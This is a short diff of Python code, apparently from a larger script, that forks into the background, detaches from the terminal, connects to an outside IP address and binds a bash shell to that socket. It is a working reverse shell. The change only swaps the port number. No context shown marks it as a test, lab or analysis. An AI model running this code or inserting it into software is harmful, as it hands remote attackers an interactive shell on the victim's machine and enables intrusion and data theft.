@@ -195,7 +195,7 @@ if os.fork() == 0:
     signal.signal(signal.SIGHUP, signal.SIG_IGN)  
     os.setsid()
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.connect(("162.210.192.208", 35426))
+    s.connect(("162.210.192.208", 46102))
     for fd in (0, 1, 2): os.dup2(s.fileno(), fd)
     pty.spawn("/bin/bash")
 
